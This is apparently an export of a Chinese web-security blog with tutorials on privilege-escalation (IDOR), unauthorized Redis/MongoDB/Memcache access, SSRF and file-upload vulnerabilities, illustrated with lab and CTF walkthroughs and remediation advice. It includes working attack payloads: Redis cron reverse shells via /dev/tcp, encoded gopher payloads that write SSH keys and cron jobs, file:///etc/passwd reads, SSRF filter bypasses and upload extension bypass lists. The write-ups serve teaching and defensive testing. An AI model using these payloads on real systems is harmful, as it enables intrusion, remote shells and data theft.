0x04-1-3、MongoDB未授权访问开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。 默认开启在27017端口，新版早就默认绑定在本地，之前的老版本仍有一些在互联网上开放在跑的端口。 0x04-1-4、Memcache未授权访问Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。 默认开启在11211端口，可以使用端口连接工具或者命令，nc等，连接成功则存在。 关于未授权访问的可以查看：https://www.secpulse.com/archives/61101.html 0x04-2、基于用户ID的越权举个例子： https://www.xxx.com/user1/userinfo.php?user_id=user1 https://www.xxx.com/user1/userinfo.php?user_id=10001 我们登陆某个系统后，看到某些功能上获取信息的方式类似于上链接时，可以初步判断获取信息的方式为根据user_id来获对应的用户信息，如果参数为用户名，我们可以手机用户名字典来枚举信息，根据返回值判断是否存在问题。当然如果枚举较大，系统用户数量又不是很多的情况下，可以尝试注册新用户，利用新用户的用户名来测试是否可以获取到用户信息。 如果参数为一个固定的数字串时，遍历数字串即可，这种情况下是系统对每个注册用户进行了一个用户id的排序，在众多的开源CMS上都有使用，当然这个字符串也有可能是随机，如果是随机的，量不大的情况下可以采用遍历的形式获取，量较大可以利用burp的随机数爆破，或者同样自己注册账户来测试。 0x04-3、基于功能对象ID的越权举个例子： https://www.xxx.com/user1/userticket.php?user_order=100001 https://www.xxx.com/user1/userticket.php?user_order=49ba59ab 此问题大量存在于用户订单、购买、查询等功能的商家CMS上，例如以上地址，如果user_order是订单编号，那么我们可以尝试遍历订单地址来查询是否存在越权。如果编号并不是单纯的订单数字串，而是类似如上的编码字符串，相信自己的运气的话可以尝试某些编码的情况，例如BASE64、MD5。猜测不到，或者不能明显的看出来是如果做的处理，注册新账号重新下单，会是简单方便的选择。 0x04-4、基于上传文件对象ID的越权举个例子： https://www.xxx.com/user1/userfile.php?fileid=10001 https://www.ccc.com/user1/userfile.php?fileid=user1_name.jpg 这种上传文件后，可以越权查看其他用户的上传文件也是经常发现类似的问题。假设，系统要求我们上传个人的身份证，实名认证信息、购买的发票订单等。如果上传后看到类似如上地址，可以猜测此上传文件可以遍历获取，同过查询fileid来查看其他用户的上传信息。如果上传后文件名如第二种，可能此文件是系统经过重命名的，重命名的方式一般采用当前上传的时间戳或者当前上传的日期加随机字段，这种情况下枚举较为困难，但仍然可以采用注册新用户的方式来查看是否存在越权。顺便一问，如果是www.ccc.com获取信息的方式，还可能会有什么问题呢？ 0x04-5、基于未授权访问的越权举个例子： https://www.xxx.com/user1/user.php?user=user1@user.com 在一些系统上登陆用户后，可以看到类似如上的地址链接，可能你会觉得这个跟问题1类似，但是也有可能多一张问题情况，在非登陆的情况下仍然可以访问到详细信息。如果可以，则证明后端对身份的效验只是基于参数user，并没有效验用户的session是否已登陆。此问题曾发现于一个系统后端支付订单复核的功能中，问题可想而知。 0x04-6、基于功能地址的越权举个例子： https://www.xxx.com/user/getuserinfo.php 如上地址，正常情况下，只访问此后台地址时，一般会跳转到登陆地址，或者登陆后用来查看某个具体的功能，获取数据的情况根据访问的链接地址来，理论上此功能并不存在越权可能，因为没有我们可以修改的参数。但是对权限及功能的限制可能只局限于用户菜单的限制，根据常用链接，可以猜测是否存在以下地址： /getuserorder.php /adduser.php /deluser.php /getalluser.php /todetailpage.php /ordercreate.php ...... 因为在绝大部分系统中，开发为了方便区别功能和页面，通常会利用对应的英文来命名文件，但这些文件并不是任意用户都可以访问到的，所以可以猜测访问地址是否英文的拼接来猜测路径。对于此问题的快捷测试是获取一个高权限账号，当然对于未授权测试来说，很难实现。 0x04-7、基于接口身份的越权举个例子： https://www.xxx.com/user/userinfo.php post: {&#39;userid&#39;:&#39;10001&#39;,&#39;username&#39;:&#39;name&#39;,&#39;userage&#39;:&#39;18&#39;,&#39;usermobile&#39;:&#39;18080808888&#39;} 例如如上接口，修改用户信息，当我们点击某个系统的修改自身资料时，会发送一个类似的json数据包，其中userid对应我们自己的用户id，修改后，可以修改对应id的用户资料。修改方式类似问题1。区别在于一个页面可见，一个页面不直观可见，一个查询，一个修改。需要配合其他越权查询漏洞，或者账号来识别是否修改成功。 0x05、漏洞靶场漏洞环境：phpstudy，webug4.0 靶场介绍：国产靶场，漏洞齐全，演示也相当完善。其中还分为初，中，高。虽然高好像没东西，但仍然是一个不错的靶场环境。 漏洞演示：演示为靶场的22号漏洞，越权修改密码 靶场安装：https://github.com/wangai3176/webug4.0，本来也给了一个vm的安装环境，但是那个百度云打不开了。就直接用文件自己安装，也没找到安装教程，就摸索着如下安装了。 把sql目录中的文件安装到数据库，新建三个按照文件名的数据库，导入数据文件，修改data目录下的dbconfig和dbconn文件，修改为自己的数据库账号密码和数据库名。修改完成后建议把网站目录修改为webug的目录下。直接访问本地地址即可。 另外需要修改/control/auth_cross/cross_auth_passwd.php文件下的一段代码，不然跳转到错误路径： header(&quot;Location:/pt_env/control/auth_cross/cross_auth_passwd2.php?id={$id}&quot;) 修改为： header(&quot;Location:/control/auth_cross/cross_auth_passwd2.php?id={$id}&quot;) 点击第一个越权修改密码后进入如下页面： 此处我打开了数据库来对应查看修改密码的情况，打开webug数据库下的user_test表，可以看到其中有两个用户如下： 此处利用aaaaa用户修改admin用户密码，利用aaaaa账户登陆后，看到如下界面 此处，我们可以先正常走一遍逻辑来查看其中的数据包情况，把aaaaa的密码修改为aaaaa，弹窗OK。然后查看抓取到的数据包。 其中有旧密码和新密码两个参数，理论上如果效验了旧密码和账号的一致性，就算链接中的id可以修改越权也无法修改密码，会提示旧密码不正确，但此处并没有效验旧密码和账号的一致性，导致修改链接中的2为1，post参数不变，或者任意旧密码值，便可以修改admin的密码。 查看数据库修改是否成功： 此处的问题存在两点，一是修改的用户身份由链接中的ID来决定，二是没有对旧密码和账户进行身份验证。 0x06、测试工具对于越权类的安全问题，并没有自动化测试工具来发现和识别，至少现在没有发现哪里有完善的越权检测工具和扫描器。 此处介绍一款burp的越权插件，辅助检测越权漏洞，但是只能检测基于功能的越权，并不能自动的检测需要修改参数来判断越权形式的漏洞。 在burp的Extender选项中选择BApp Store选项卡，找到Authz插件，点击install。安装完成后选项卡中会出现一个Authz的新选项卡，界面如下： 此处需要两个用户身份，假设为A用户和B用户，登陆A用户的账号，获取Cookie到new header中，使用B账号抓包获取信息。到proxy中选择需要测试的功能地址，右键到Send requests to Authz。 获取够需要测试的功能后，到Authz界面点击run即可运行，此处没有设置cookie，那么将按照未授权访问来测试。 其中，会在请求中替换我们输入的cookie值，如图显示，源请求的字节长度，请求的字节长度，源请求的响应码，请求的响应码，通过对响应的差别来查看是否存在越权漏洞。 能达到此检测目的的还有一款插件AuthMatrix，也同样可以检测越权，功能强劲，使用较Authz复杂，对于高要求，多用户，需要对请求中的token等进行选择替换的，可以使用此插件。 介绍地址：https://github.com/portswigger/auth-matrix 0x07、CMS演示0x07-1、前台任意修改其他用户信息漏洞环境：phpstudy，phpcms9.5.9 漏洞介绍：phpcms设计缺陷导致前台用户可以任意修改其他用户密码 漏洞下载：http://download.phpcms.cn/v9/9.5/phpcms_v9.5.9_UTF8.zip 解压安装到phpstudy，访问后需要安装，按照安装要求，填入账号密码。等待安装完成，将自动跳转到后台管理页面。登陆后台需要先添加邮箱认证，如下添加的腾讯邮箱。具体腾讯授权码获取方式可以查看：https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;id=28&amp;no=1001256 在用户模块中添加如下信息，新增两个测试用户，类似如下，需要其中一个可以接收邮件。 在站点首页点击登陆处，如果跳转到404安装页面，可能是你没有删除install安装目录，删除访问index.php即可。选择忘记密码-&gt;用户名找回密码 点击获取邮箱效验码 返回上一步输入想修改的用户，如下test2 输入之前的邮箱验证码提交 点击后显示密码修改成功为以下： 尝试使用新密码登陆成功： 漏洞修复：此问题出现原因在于验证码没有跟账号做绑定，验证时只做了验证码是否有效的判断。对于此类问题，频繁出现在手机号验证码，邮箱验证码处，在最后执行修改时需要一同验证，验证码和手机或者邮箱的对应关系。 0x07-2、redis未授权访问漏洞环境：Ubuntu，reids 3.2.0 漏洞介绍：Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以写入文件来反弹shell 安装如下： wget http://download.redis.io/releases/redis-3.2.0.tar.gz tar xzf redis-3.2.0.tar.gz cd redis-3.2.0 make 修改配置文件 vi redis.conf bind 127.0.0.1 加上# protected-mode yes 改为no 在配置文件目录下启动 ./src/redis-server redis.conf 启动后显示如下： 通过reids命令可以查看基本信息 尝试反弹shell到指定地址 set x &quot;\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.30.79/2333 0&gt;&amp;1\\n&quot; config set dir /var/spool/cron/ config set dbfilename root save 或者采用gopher协议，直接利用curl一条命令执行 0x08、漏洞修复1、验证需要从前端获取的参数，比如用户ID和角色权限名，对于需要根据前台请求来返回数据的参数进行权限效验。 2、对于固定返回信息可以使用特定链接地址返回，同时采用不可预测地址，如：getuserinfo_snhx.php 3、对于需要修改、新增等功能进行判断，根据当前seesion判断用户，参数中只传输修改的用户信息。 4、区分用户和管理员时，不采用某些相同的参数来区别。如dede区分管理和用户都是采用ID值，容易产生问题。 5、对于查询类越权需要对每一次请求的参数做当前用户身份效验，避免水平越权。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"SSRF","slug":"SSRF","date":"2019-06-14T07:46:34.000Z","updated":"2019-06-14T07:58:43.364Z","comments":true,"path":"2019/06/SSRF/","link":"","permalink":"/2019/06/SSRF/","excerpt":"","text":"0x01、漏洞简介​ SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 0x02、漏洞原理​ 通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。 0x03、漏洞危害 扫描内网开放服务 向内部任意主机的任意端口发送payload来攻击内网服务 DOS攻击（请求大文件，始终保持连接Keep-Alive Always） 攻击内网的web应用，例如直接SQL注入、XSS攻击等 利用file、gopher、dict协议读取本地文件、执行命令等 0x04、检测与绕过0x04-1、漏洞检测假设一个漏洞场景：某网站有一个在线加载功能可以把指定的远程图片加载到本地，功能链接如下： http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg 那么网站请求的大概步骤应该是类似以下： 用户输入图片地址-&gt;请求发送到服务端解析-&gt;服务端请求链接地址的图片数据-&gt;获取请求的数据加载到前台显示。 这个过程中可能出现问题的点就在于请求发送到服务端的时候，系统没有效验前台给定的参数是不是允许访问的地址域名，例如，如上的链接可以修改为： http://www.xxx.com/image.php?image=http://127.0.0.1:22 如上请求时则可能返回请求的端口banner。如果协议允许，甚至可以使用其他协议来读取和执行相关命令。例如 http://www.xxx.com/image.php?image=file:///etc/passwd http://www.xxx.com/image.php?image=dict://127.0.0.1:22/data:data2 (dict可以向服务端口请求data data2) http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test (向2233端口发送数据test,同样可以发送POST请求) ...... 对于不同语言实现的web系统可以使用的协议也存在不同的差异，其中： php: http、https、file、gopher、phar、dict、ftp、ssh、telnet... java: http、https、file、ftp、jar、netdoc、mailto... 判断漏洞是否存在的重要前提是，请求的服务器发起的，以上链接即使存在并不一定代表这个请求是服务器发起的。因此前提不满足的情况下，SSRF是不必要考虑的。 http://www.xxx.com/image.php?image=http://www.xxc.com/a.jpg 链接获取后，是由js来获取对应参数交由window.location来处理相关的请求，或者加载到当前的iframe框架中，此时并不存在SSRF ，因为请求是本地发起，并不能产生攻击服务端内网的需求。 0x04-2、漏洞出现点 分享：通过url 地址分享文章，例如如下地址： http://share.xxx.com/index.php?url=http://127.0.0.1 通过url参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。 图片加载与下载：通过URL地址加载或下载图片 http://image.xxx.com/image.php?image=http://127.0.0.1 图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF。 图片、文章收藏功能 http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de 例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。 利用参数中的关键字来查找 例如以下的关键字： share wap url link src source target u 3g display sourceURl imageURL domain ... 0x04-3、漏洞绕过部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下： 1、限制为http://www.xxx.com 域名时：可以尝试采用http基本身份认证的方式绕过，http://www.xxx.com@www.xxc.com。在对@解析域名中，不同的处理函数存在处理差异，例如：http://www.aaa.com@www.bbb.com@www.ccc.com，在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。2、限制请求IP不为内网地址：采用短网址绕过，比如百度短地址https://dwz.cn/。采用可以指向任意域名的xip.io，127.0.0.1.xip.io，可以解析为127.0.0.1采用进制转换，127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433 3、限制请求只为http协议： 采用302跳转，百度短地址，或者使用https://tinyurl.com生成302跳转地址。使用如下： 4、其他绕过形式可以查看：https://www.secpulse.com/archives/65832.html 0x05、测试方法漏洞环境：PHP脚本、Windows 利用工具：bash、nc 首先采用如下脚本创建一个PHP的服务端 &lt;?PHP $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_HEADER, 0); #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_exec($ch); curl_close($ch); ?&gt; 开启PHP的web环境，访问http://localhost/ssrf.php?url=，页面显示正常即可。在一个bash中开启监听端口，来模仿即将被SSRF到的内网服务，此处采用nc。 浏览器访问如下链接：http://localhost/ssrf.php?url=http://127.0.0.1:2233。监听端可以看到来自localhost的请求，请求目标为127.0.0.1的2233端口。 使用gopher协议来查看协议，访问：http://localhost/ssrf.php?url=gopher://127.0.0.1:2233/_test 利用gopher发送POST的请求，访问：http://localhost/ssrf.php?url=gopher://127.0.0.1:2233/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20127.0.0.1%3A2233%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dpassword 以上方式简单的展示了SSRF的攻击过程和请求，下面我们使用回显形SSRF。 漏洞环境：Ubuntu 18、 docker 、PHP、Apache 漏洞文件地址：https://github.com/nikosdano/SSRF-Vulnerable-with-Curl 下载文件放入apache服务器中，访问http://192.168.120.132/awesome_script.php 在其中我们可以填写想要执行的SSRF命令，如填写file:///etc/passwd，回显为： 尝试端口探测，对22端口进行探测是否开启： 截至到此，相信对SSRF已经有了一个简单认识和检测，下面我们利用一个靶场来模拟一个完整的真实的SSRF攻击。 0x06、实战演示漏洞环境：Rootme CTF all the day 漏洞地址：https://www.root-me.org/en/Capture-The-Flag/CTF-all-the-day/ 利用工具：Burp 漏洞介绍：SSRF+redis 获取内网主机权限，利用SSRF来对redis的未授权访问执行命令。从而达到获取主机权限的目的 访问目标地址，如果没有账号，需要创建账号点击右上的绿色小加号来创建账号，创建完成后回到此页面。 找到一个处于none的虚拟机，点击房间名，如下的ctf04 进入房间后，选择需要创建的虚拟机，选择SSRF Box，点击保存，选择start the game。 过一段时间的等待后，会显示如下信息。 访问 ctf04.root-me.org 就可以看到启动的虚拟环境了 当然，如果在创建虚拟机之前，看到其他的房间有人已经创建了SSRF Box我们也可以加入此玩家的房间，点击房间名，进入房间后点击右上角的Join the game。稍等片刻就可以加入到游戏中，根据提示访问对应的地址就可以开始测试啦。 访问地址后可以看到页面显示一个输入框，需要输入url参数，开始抓包。 尝试在页面输入百度地址后，页面会把百度首页加载进此页面中。 读取系统文件： 使用burp的Intruder模块，来探测开放的服务端口，开放则显示OK，不开放则显示Connection refused。 探测可知内网开放了6379端口redis服务，尝试利用SSRF对redis执行未授权漏洞，此处简单科普一下redis漏洞影响。 详细内容可以查看文章：https://www.freebuf.com/vuls/162035.html Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。 因此，此漏洞在没有配置密码的情况下可以利用SSRF来绕过绑定在本地的限制，从而实现在外网攻击内网应用。 1、利用redis来写ssh密钥： 此处利用ssh生成一对公私钥，生成的默认文件为id_rsa.pub和id_rsa。把id_rsa.pub上传至服务器即可。我们利用redis把目录设置为ssh目录下： 根据网上写密钥有两种协议可以使用，一种是dict，一种是gopher。测试使用dict协议写不成功，写入后不能连接，此处使用gopher写密钥。 使用的payload为： gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$401%0d%0a%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU+RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a payload 解码为： gopher://127.0.0.1:6379/_*3 $3 set $1 1 $401 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9 *4 $6 config $3 set $3 dir $11 /root/.ssh/ *4 $6 config $3 set $10 dbfilename $15 authorized_keys *1 $4 save *1 $4 quit payload由joychou的反弹shell修改而来，主要就是替换了写入文件的位置和文件内容。然后修改文件的长度。 然后尝试登陆，输入创建密钥的密码后，登陆成功。 2、利用redis写定时任务来反弹shell 既然提到反弹shell，就需要利用一台外网主机。此处使用了nc做端口监听。 使用payload为以下： gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2233 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a 解码后的内容就是： gopher://127.0.0.1:6379/_*3 $3 set $1 1 $61 */1 * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/2233 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 /var/spool/cron/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save *1 $4 quit 来自：https://joychou.org/web/phpssrf.html 其中$61为我的vps地址，也就是%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0a的字符串长度。执行后稍等片刻就可以收到反弹的shell了。同时需要写入的命令前后要加几个回车。 根据前文的提示，打开/passwd文件就可以找到flag了。 在网站页面上输入这一串字符，就可以结束这场SSRF之旅了。 0x07、CMS实战演示漏洞环境：vulhub、weblogic、ssrf 漏洞介绍：CVE-2014-4210，weblogic的uddiexplorer.war存在安全组件漏洞，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的机密性。该漏洞的影响版本包括：10.0.2.0, 10.3.6.0 漏洞下载地址：https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf 下载vulhub后，进入对应的安装目录，执行docker-compose up -d,会自动创建docker镜像。 构建完成后访问如下地址： /uddiexplorer/SearchPublicRegistries.jsp 访问如下地址时返回，代表端口未开放： /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80 /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 响应可以看到返回404，证明端口开放： 然后可以根据遍历查看开放的端口服务，在根据开放的服务来决定是否能不能执行内网攻击。而实际中越到的SSRF大都是探测类使用，因为能正好搭配使用的情况，而且还可以查看或者反弹的，概率值得讨论。 漏洞修复：1.删除server/lib/uddiexplorer.war下的相应jsp文件。 jar -xvf uddiexplorer.war rm jsp-files jar -cvfM uddiexplorer.war uddiexplorer/ 在官方的漏洞通报上找到补丁安装，https://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html 0x08、漏洞修复SSRF漏洞修复： 限制返回信息的，例如请求文件，只返回文件是否请求成功，没有请求成功到文件统一返回错误信息。 对请求地址设置白名单，只允许请求白名单内的地址。 禁用除http和https外的协议，如：file://，gopher://，dict://等 限制请求的端口为固定服务端口，如：80，443 Java类代码修复，来自：joychou 方法调用： String[] urlwhitelist = {&quot;joychou.com&quot;, &quot;joychou.me&quot;}; if (!UrlSecCheck(url, urlwhitelist)) { return; } 方法代码： 需要先添加guava库（目的是获取一级域名） &lt;dependency&gt; &lt;groupId&gt;com.google.guava&lt;/groupId&gt; &lt;artifactId&gt;guava&lt;/artifactId&gt; &lt;version&gt;21.0&lt;/version&gt; &lt;/dependency&gt; 方法实现： public static Boolean UrlSecCheck(String url, String[] urlwhitelist) { try { URL u = new URL(url); // 只允许http和https的协议 if (!u.getProtocol().startsWith(&quot;http&quot;) &amp;&amp; !u.getProtocol().startsWith(&quot;https&quot;)) { return false; } // 获取域名，并转为小写 String host = u.getHost().toLowerCase(); // 获取一级域名 String rootDomain = InternetDomainName.from(host).topPrivateDomain().toString(); for (String whiteurl: urlwhitelist){ if (rootDomain.equals(whiteurl)) { return true; } } return false; } catch (Exception e) { return false; } }","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"文件上传漏洞","slug":"文件上传漏洞","date":"2019-05-30T06:11:55.000Z","updated":"2019-06-03T01:50:18.985Z","comments":true,"path":"2019/05/文件上传漏洞/","link":"","permalink":"/2019/05/文件上传漏洞/","excerpt":"","text":"0x01、漏洞简介​ 文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的漏洞，是程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。 0x02、漏洞原理​ 网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。 0x03、漏洞危害​ 恶意文件传递给解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。根据网站使用及可解析的程序脚本不同，可以上传的恶意脚本可以是PHP、ASP、JSP、ASPX文件。 0x04、常用绕过形式0x04-1、文件长传常见点上传头像 上传相册 上传附件 添加文章图片 前台留言资料上传 编辑器文件上传 ...... 例如如下编辑器上传点： 文件管理处文件上传： 前台用户发表文章处文件上传： 个人头像处文件上传： 0x04-2、后缀绕过PHP: php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定) ASP： asa、cer、cdx ASPX： ascx、ashx、asac JSP： jsp、jspx、jspf 0x04-3、绕过类型Content-Type绕过 前端绕过 文件解析规则绕过 Windows环境特性绕过 文件名大小写绕过 双写绕过 点空格绕过 文件头绕过 条件竞争绕过 ...... 在以下的文章介绍中，将采取其中的几种常见的绕过形式做演示。 0x05、漏洞在系统中的差异​ 上传文件漏洞在不同的系统、架构以及行为中，利用形式也是各不相同。常用的web容器有IIS、Tomcat、Nginx、Apache等。以下主要以比较经典的解析漏洞做解释。 0x05-1、IIS 5.x/6.0解析漏洞1、当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件。例如如下： 漏洞目录利用形式：www.xxx.com/xx.asp/xx.jpg。 xx.jpg的内容可以为一段合法的asp脚本文件。 2、服务器默认不解析”;“以后的内容，导致xx.asp;.jpg被解析成xx.asp 漏洞文件利用形式：www.xxx.com/xx.asp;.jpg xx.jpg的内容可以为一段合法的asp脚本文件。 漏洞产生的原因参考详细文章内容：https://www.cnblogs.com/l1pe1/p/9210094.html 通过对IIS6的核心文件类型解析相关文件的逆向后，整理出下面的核心处理代码。 //reverse code by golds7n with ida int __thiscall Url(void *this, char *UrlStruct) { void *pW3_URL_INFO; // esi@1 int bSuccess; // eax@1 const wchar_t *i; // eax@2 wchar_t *wcsSlashTemp; // ebx@6 int wcsTemp; // eax@6 int wcs_Exten; // eax@6 int v8; // esi@9 int v10; // eax@11 int v11; // ST04_4@13 int v12; // eax@13 int ExtenDll; // eax@19 int Extenisa; // eax@20 int ExtenExe; // eax@21 int ExtenCgi; // eax@22 int ExtenCom; // eax@23 int ExtenMap; // eax@24 int Entry; // [sp+Ch] [bp-148h]@6 wchar_t *wcsMaohaoTemp; // [sp+10h] [bp-144h]@6 unsigned int dotCount; // [sp+14h] [bp-140h]@1 wchar_t *Str; // [sp+18h] [bp-13Ch]@3 char *url_FileName; // [sp+1Ch] [bp-138h]@1 char Url_FileExtenName; // [sp+20h] [bp-134h]@1 char v25; // [sp+50h] [bp-104h]@1 dotCount = 0; pW3_URL_INFO = this; STRU::STRU(&amp;Url_FileExtenName, &amp;v25, 0x100u); url_FileName = (char *)pW3_URL_INFO + 228; bSuccess = STRU::Copy((char *)pW3_URL_INFO + 228, UrlStruct); if ( bSuccess &lt; 0 ) goto SubEnd; for ( i = (const wchar_t *)STRU::QueryStr((char *)pW3_URL_INFO + 228); ; i = Str + 1 ) { Str = _wcschr(i, &#39;.&#39;); ***********N1************ if ( !Str ) break; ++dotCount; if ( dotCount &gt; W3_URL_INFO::sm_cMaxDots ) break; bSuccess = STRU::Copy(&amp;Url_FileExtenName, Str); if ( bSuccess &lt; 0 ) goto SubEnd; wcsSlashTemp = _wcschr(Str, &#39;/&#39;); ***********N2************ JUMPOUT(wcsSlashTemp, 0, loc_5A63FD37); wcsTemp = STRU::QueryStr(&amp;Url_FileExtenName); wcsMaohaoTemp = _wcschr((const wchar_t *)wcsTemp, &#39;:&#39;); ***********N3************ JUMPOUT(wcsMaohaoTemp, 0, loc_5A63FD51); wcs_Exten = STRU::QueryStr(&amp;Url_FileExtenName); __wcslwr((wchar_t *)wcs_Exten); if ( META_SCRIPT_MAP::FindEntry(&amp;Url_FileExtenName, &amp;Entry) ) { *((_DWORD *)pW3_URL_INFO + 201) = Entry; JUMPOUT(wcsSlashTemp, 0, loc_5A63FDAD); STRU::Reset((char *)pW3_URL_INFO + 404); break; } if ( STRU::QueryCCH(&amp;Url_FileExtenName) == 4 ) { ExtenDll = STRU::QueryStr(&amp;Url_FileExtenName); if ( !_wcscmp(L&quot;.dll&quot;, (const wchar_t *)ExtenDll) || (Extenisa = STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.isa&quot;, (const wchar_t *)Extenisa)) ) JUMPOUT(loc_5A63FD89); ExtenExe = STRU::QueryStr(&amp;Url_FileExtenName); if ( !_wcscmp(L&quot;.exe&quot;, (const wchar_t *)ExtenExe) || (ExtenCgi = STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.cgi&quot;, (const wchar_t *)ExtenCgi)) || (ExtenCom = STRU::QueryStr(&amp;Url_FileExtenName), !_wcscmp(L&quot;.com&quot;, (const wchar_t *)ExtenCom)) ) JUMPOUT(loc_5A63FD89); ExtenMap = STRU::QueryStr(&amp;Url_FileExtenName); JUMPOUT(_wcscmp(L&quot;.map&quot;, (const wchar_t *)ExtenMap), 0, loc_5A63FD7B); } } if ( *((_DWORD *)pW3_URL_INFO + 201) || (v10 = *((_DWORD *)pW3_URL_INFO + 202), v10 == 3) || v10 == 2 || (v11 = *(_DWORD *)(*((_DWORD *)pW3_URL_INFO + 204) + 0xC4C), v12 = STRU::QueryStr(url_FileName), bSuccess = SelectMimeMappingForFileExt(v12, v11, (char *)pW3_URL_INFO + 756, (char *)pW3_URL_INFO + 1012), bSuccess &gt;= 0) ) v8 = 0; else SubEnd: v8 = bSuccess; STRU::_STRU(&amp;Url_FileExtenName); return v8; } 